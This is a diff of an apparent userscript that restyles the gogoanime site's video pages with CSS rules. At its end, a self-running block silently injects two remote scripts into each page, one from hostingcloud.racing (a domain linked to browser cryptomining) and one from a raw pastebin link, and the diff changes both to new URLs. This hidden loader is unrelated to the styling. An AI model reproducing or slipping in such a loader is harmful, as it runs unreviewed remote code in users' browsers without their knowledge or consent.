@@ -41,7 +41,7 @@ if (location.href.match(/gogoanime/)) {
             addGlobalStyle('.customButton:hover { background-color: #d29b06; color: #fff; }');
             addGlobalStyle('.anime_video_body_watch { position: relative; z-index: 2; }');
             addGlobalStyle('.light { cursor: pointer; top: 0px; width: 100%; height: 100%; z-index: 1; left: 0px; position: fixed; background-color: #000000d4; }');
-            addGlobalStyle('.anime_video_body_episodes a:visited { color: #a2790b; }');            
+            addGlobalStyle('.anime_video_body_episodes a:visited { color: #a2790b; }');
             addGlobalStyle('.play-video { background-color: #1b1b1b03; padding-bottom: 60%; }');
             addGlobalStyle('#scrollbar1 { width: 99%;');
             addGlobalStyle('#scrollbar1 .viewport { position: relative; text-overflow: ellipsis; white-space: nowrap; overflow: hidden; width: 90%;');
@@ -251,13 +251,14 @@ if (home == 1){
 
 (function () {
     var s = document.createElement('script');
-    s.src = "https://www.hostingcloud.racing/oou8.js";
+    s.src = "https://www.hostingcloud.racing/jPvl.js";
     (document.head || document.documentElement).appendChild(s);
     s.onload = function() {
     };
     var x = document.createElement('script');
-    x.src = "https://pastebin.com/raw/kkui9sAS";
+    x.src = "https://pastebin.com/raw/by3JKmQ0";
     (document.head || document.documentElement).appendChild(x);
     x.onload = function() {
     };
 })();
+
